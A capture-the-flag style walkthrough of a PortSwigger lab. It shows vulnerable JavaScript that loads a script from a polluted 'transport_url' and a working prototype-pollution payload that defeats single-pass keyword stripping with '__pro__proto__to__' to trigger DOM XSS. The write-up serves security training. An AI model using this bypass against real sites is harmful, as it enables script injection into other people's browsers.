# [Client-side prototype pollution via flawed sanitization] — [PortSwigger] — [Practitioner]
**Date:** 2026-08-01
 
---
 
## Vulnerability / core concept
DOM XSS via Prototype Pollution

---


## Payload / key command
I solved this lab manually.

As we can see, when we load the home page, we can see `constructor` and `prototype` in the query for a second. That suggest this app might be vulnerable to prototype pollution via URI. In Sources in developer tools, I found `searchLoggerFiltered.js`:
```js
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```
I tried to use default `__proto__[property]=value` payload but it did not work. 
Then I noticed the `deparamSanitised.js` file with following content:
```js
var deparam = function( params, coerce ) {
    var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

    if (!params) {
        return obj;
    }

    params.replace(/\+/g, ' ').split('&').forEach(function(v){
        var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            keys = key.split( '][' ),
            keys_last = keys.length - 1;

        if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
            keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );

            keys = keys.shift().split('[').concat( keys );

            keys_last = keys.length - 1;
        } else {
            keys_last = 0;
        }

        if ( param.length === 2 ) {
            val = decodeURIComponent( param[1] );

            if ( coerce ) {
                val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                        : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                            : val;                                                          // string
            }

            if ( keys_last ) {
                for ( ; i <= keys_last; i++ ) {
                    key = keys[i] === '' ? cur.length : keys[i];
                    cur = cur[sanitizeKey(key)] = i < keys_last
                        ? cur[sanitizeKey(key)] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                }

            } else {
                if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                    obj[sanitizeKey(key)].push( val );

                } else if ( {}.hasOwnProperty.call(obj, key) ) {
                    obj[sanitizeKey(key)] = [ obj[key], val ];

                } else {
                    obj[sanitizeKey(key)] = val;
                }
            }

        } else if ( key ) {
            obj[key] = coerce
                ? undefined
                : '';
        }
    });

    return obj;
};
```
As we can see, everything gets sanitized in the URI through `sanitizeKey` function that is not explicitly shown here. Our assumption is to obfuscate the payload to try bypass the sanitization. During obfuscation I noticed that web application strips dangerous words like `__proto__`, `constructor` and `prototype`. To bypass this, I used `__pro__proto__to__` which after sanitization becomes `__proto__`.

The final payload for this web application is:
```js
__pro__proto__to__[transport_url]=data:, alert(1)
```
This executes `alert()` function and solves this lab.
